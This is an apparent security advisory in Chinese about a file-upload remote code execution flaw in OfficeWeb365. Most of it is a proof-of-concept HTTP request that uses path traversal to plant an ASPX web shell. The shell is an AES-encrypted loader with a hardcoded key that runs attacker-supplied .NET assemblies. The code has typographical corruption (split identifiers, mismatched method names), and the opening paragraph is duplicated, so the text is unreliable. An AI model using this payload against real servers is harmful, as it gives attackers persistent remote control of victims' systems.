## OfficeWeb365 文件上传漏洞
【消息详情】：360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453，情报订阅用户可登录漏洞云情报平台( https://loudongyun.360.cn/bug/list )查看漏洞详情。
360漏洞云监测到网传《OfficeWeb365远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-2023-0000245
```
POST /PW/SaveDraw?path=../../Content/img&idx=1.aspx HTTP/1.1
Host: 
Content-Length: 500817
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4
Accept-Encoding: gzip, deflate

data:image/png;base64,01s34567890123456789y12345678901234567m91<% @ Page Language="C #"%>

<% @ Import namespace="System. Reflection"%>

<Script Run="Server">

Private byte decryption (byte data)

{

String key="e45e329feb5d925b";

Data=Convert. FromBase64String (System. Text. Encoding. UTF8. GetString (data));

System. Security. Cryptography. RijndaelManaged aes=new System. Security. Cryptography. RijndaelManaged();

Aes. Mode=System. Security. Cryptography. CipherMode. ECB;

Aes. Key=Encoding. UTF8. GetBytes (key);

Aes. Padding=System. Security. Cryptography. PaddingMode. PKCS7;

Return aes. CreateDecryptor(). TransformFinalBlock (data, 0, data. Length);

}

Private Byte Encryption (Byte Data)

{

String key="e45e329feb5d925b";

System. Security. Cryptography. RijndaelManaged aes=new System. Security. Cryptography. RijndaelManaged();

Aes. Mode=System. Security. Cryptography. CipherMode. ECB;

Aes. Key=Encoding. UTF8. GetBytes (key);

Aes. Padding=System. Security. Cryptography. PaddingMode. PKCS7;

Return System. Text. Encoding. UTF8. GetBytes (Convert. ToBase64String (aes. CreateEncryptor(). TransformFinalBlock (data, 0, data. Length)));

}

</Script>

<%

//Byte [] c=Request. BinaryRead (Request. ContentLength); Assembly. Load (Decrypt (c)). CreateInstance ("U"). Equals (this);

Byte [] c=Request. BinaryRead (Request. ContentLength);

String asname=System. Text. Encoding. ASCII. GetString (new byte [] {0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2e, 0x52, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x2e, 0x41, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79});

Type Assembly=Type. GetType (asname);

MethodInfo load=assembly. GetMethod ("Load", new Type [] {new byte [0]. GetType()});

Object obj=load. Invoke (null, new object [] {Decrypt (c)});

MethodInfo create=assembly. GetMethod ("CreateInstance", new Type [] {"". GetType()});

String name=System. Text. Encoding. ASCII. GetString (new byte [] {0x55});

Object pay=create. Invoke (obj, new object [] {name});

Pay. Equals (this);%>>---

```
